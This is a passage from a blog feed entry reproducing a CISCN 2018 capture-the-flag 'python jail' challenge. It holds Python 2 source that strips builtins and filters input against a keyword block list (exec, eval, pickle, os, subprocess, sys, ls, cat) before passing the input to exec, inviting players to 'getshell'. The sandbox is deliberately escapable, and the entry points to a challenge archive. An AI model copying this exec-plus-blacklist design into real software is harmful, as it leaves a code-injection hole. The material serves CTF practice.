class="keyword">import</span> FunctionType</span><br><span class="line"></span><br><span class="line">main  = modules[<span class="string">'__main__'</span>].__dict__</span><br><span class="line">origin_builtins = main[<span class="string">'__builtins__'</span>].__dict__</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span><span class="params">()</span>:</span></span><br><span class="line">    type_dict = get_dict(type)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__bases__'</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__subclasses__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span><span class="params">()</span>:</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'func_code'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_import</span><span class="params">(__import__,whiteList)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">importer</span><span class="params">(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">return</span> __import__(name,globals,locals,fromlist,level)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"HAHA,[%s]  has been banned~"</span> % name</span><br><span class="line">    <span class="keyword">return</span> importer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadOnly</span><span class="params">(dict)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for ReadOnlu"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self,keys)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self,key,default=None)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">popitem</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setdefault</span><span class="params">(self,key,value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self,key,value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self,dict,**kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span><span class="params">()</span>:</span></span><br><span class="line">    whiteList = <span class="string">"raw_input  SyntaxError   ValueError  NameError  Exception __import__"</span>.split(<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">not</span> <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span><span class="params">(string)</span>:</span></span><br><span class="line">    ban = <span class="string">"exec eval pickle os subprocess input sys ls cat"</span>.split(<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ban:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.lower():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"&#123;&#125; has been banned!"</span>.format(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_type();</span></span><br><span class="line"><span class="keyword">del</span> delete_type</span><br><span class="line">delete_func_code();<span class="keyword">del</span> delete_func_code</span><br><span class="line">builtins_clear();<span class="keyword">del</span> builtins_clear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whiteMod = []</span><br><span class="line">origin_builtins[<span class="string">'__import__'</span>] = safe_import(__import__,whiteMod)</span><br><span class="line">safe_builtins = ReadOnly(origin_builtins);<span class="keyword">del</span> ReadOnly</span><br><span class="line">main[<span class="string">'__builtins__'</span>] = safe_builtins;<span class="keyword">del</span> safe_builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType</span><br><span class="line"><span class="keyword">del</span> __builtins__, __doc__, __file__, __name__, __package__</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">  ____</span></span><br><span class="line"><span class="string"> |  _ \ _   _ _ __</span></span><br><span class="line"><span class="string"> | |_) | | | | '_ \</span></span><br><span class="line"><span class="string"> |  _ &lt;| |_| | | | |</span></span><br><span class="line"><span class="string"> |_| \_\\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Escape from the dark house built with python :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Try to getshell then find the flag!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp = raw_input(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    cmd = input_filter(inp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> cmd</span><br><span class="line">    <span class="keyword">except</span> NameError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"wow something lose!We can\'t find it !  D:"</span></span><br><span class="line">    <span class="keyword">except</span> SyntaxError,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Noob! Synax Wrong! :("</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"unknow error,try again  :&gt;"</span></span><br></pre></td></tr></table></figure><p>/home/ctf/bin</p><p><img src="1525027843540.png" alt="1525027843540"></p><h1 id="È¢òÁõÆÂ§á‰ªΩ"><a href="#È¢òÁõÆÂ§á‰ªΩ" class="headerlink" title="È¢òÁõÆÂ§á‰ªΩ"></a>È¢òÁõÆÂ§á‰ªΩ</h1><p><a href="https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ÂÖ®ÈÉ®ËµõÈ¢òÔºö&lt;a href=&quot;https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/findneo/
      
    
    </summary>
    
    
  </entry>
  
</feed>
